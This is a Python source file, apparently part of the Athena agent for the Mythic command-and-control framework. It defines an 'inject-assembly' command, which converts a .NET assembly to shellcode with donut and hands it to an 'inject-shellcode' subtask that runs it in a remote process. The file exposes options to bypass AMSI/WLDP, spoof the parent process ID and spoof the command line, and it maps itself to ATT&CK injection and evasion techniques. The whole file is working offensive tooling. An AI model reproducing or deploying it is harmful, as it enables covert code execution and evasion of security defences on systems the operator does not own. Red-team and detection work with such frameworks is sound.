from mythic_container.MythicCommandBase import *  # import the basics
import json  # import any other code you might need
# import the code for interacting with Files on the Mythic server
from mythic_container.MythicRPC import *
import donut
import tempfile
import base64
import os

from .athena_utils import message_converter

# create a class that extends TaskArguments class that will supply all the arguments needed for this command
class InjectAssemblyArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        # this is the part where you'd add in your additional tasking parameters
        self.args = [
            CommandParameter(
                name="file",
                type=ParameterType.File,
                description="The assembly to inject",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=0,
                    )
                ],
            ),
            CommandParameter(
                name="commandline",
                type=ParameterType.String,
                description="The name of the process to inject into",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=1,
                    )
                ],
            ),
            CommandParameter(
                name="arguments",
                type=ParameterType.String,
                description = "Arguments that are passed to the assembly",
                default_value = "",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=2,
                    )
                ],
            ),
            CommandParameter(
                name="parent",
                type=ParameterType.Number,
                description = "If set, will spoof the parent process ID",
                default_value = 0,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=3,
                    )
                ],
            ),
            CommandParameter(
                name="spoofedcommandline",
                type=ParameterType.String,
                description="Display assembly output. Default: True",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=4,
                    )
                ],
            ),
            CommandParameter(
                name="output",
                type=ParameterType.Boolean,
                description = "Display assembly output. Default: True",
                default_value = True,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=5,
                    )
                ],
            ),
            CommandParameter(
                name="arch",
                type=ParameterType.ChooseOne,
                choices=["x86","x64", "AnyCPU"],
                description="Target architecture for loader",
                default_value="AnyCPU",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=6,
                    )
                ],
            ),
            CommandParameter(
                name="bypass",
                type=ParameterType.Number,
                description="Behavior for bypassing AMSI/WLDP : 1=None, 2=Abort on fail, 3=Continue on fail (default)",
                default_value=3,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=7,
                    )
                ],
            ),
            CommandParameter(
                name="exit_opt",
                type=ParameterType.Number,
                description="Determines how the loader should exit. 1=exit thread, 2=exit process (default), 3=Do not exit or cleanup and block indefinitely",
                default_value = 2,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=8,
                    )
                ],
            ),
        ]

    # you must implement this function so that you can parse out user typed input into your paramters or load your parameters based on some JSON input
    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)


# this is information about the command itself
class InjectAssemblyCommand(CommandBase):
    cmd = "inject-assembly"
    needs_admin = False
    script_only = True
    help_cmd = "inject-assembly"
    description = "Use donut to convert a .NET assembly into shellcode and execute the buffer in a remote process"
    version = 1
    author = ""
    argument_class = InjectAssemblyArguments
    attackmapping = ["T1055", "T1564.010", "T1134.004"]
    browser_script = None
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        builtin=False
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
#       Get original file info
        fData = FileData()
        fData.AgentFileId = taskData.args.get_arg("file")
        file_rpc = await SendMythicRPCFileGetContent(fData)
        
        if not file_rpc.Success:
            raise Exception("Failed to get file contents: " + file_rpc.Error)

        #Create a temporary file
        tempDir = tempfile.TemporaryDirectory()

        with open(os.path.join(tempDir.name, "assembly.exe"), "wb") as file:
            file.write(file_rpc.Content)

        donut_arch = 0
        if taskData.args.get_arg("arch") == "AnyCPU":
            donut_arch = 3
        elif taskData.args.get_arg("arch") == "x64":
            donut_arch = 2
        elif taskData.args.get_arg("arch") == "x86":
            donut_arch = 1

        shellcode = donut.create(
            file=os.path.join(tempDir.name, "assembly.exe"),
            arch = donut_arch,
            bypass = taskData.args.get_arg("bypass"),
            params = taskData.args.get_arg("arguments"),
            exit_opt = taskData.args.get_arg("exit_opt"),
        )

        fileCreate = MythicRPCFileCreateMessage(taskData.Task.ID, DeleteAfterFetch = True, FileContents = shellcode, Filename = "shellcode.bin")

        shellcodeFile = await SendMythicRPCFileCreate(fileCreate)

        if not shellcodeFile.Success:
            raise Exception("Failed to create file: " + shellcodeFile.Error)
        
        token = 0
        createSubtaskMessage = MythicRPCTaskCreateSubtaskMessage(taskData.Task.ID, 
                                                                CommandName="inject-shellcode", 
                                                                Params=json.dumps(
                                                                {   "file": shellcodeFile.AgentFileId, 
                                                                    "commandline": taskData.args.get_arg("commandline"),
                                                                    "spoofedcommandline": taskData.args.get_arg("spoofedcommandline"),
                                                                    "output": taskData.args.get_arg("output"),
                                                                    "parent": taskData.args.get_arg("parent")}),
                                                                Token=taskData.Task.TokenID)


        subtask = await SendMythicRPCTaskCreateSubtask(createSubtaskMessage)

        if not subtask.Success:
            raise Exception("Failed to create subtask: " + subtask.Error)

        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        if "message" in response:
            user_output = response["message"]
            await MythicRPC().execute("create_output", task_id=task.Task.ID, output=message_converter.translateAthenaMessage(user_output))

        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp

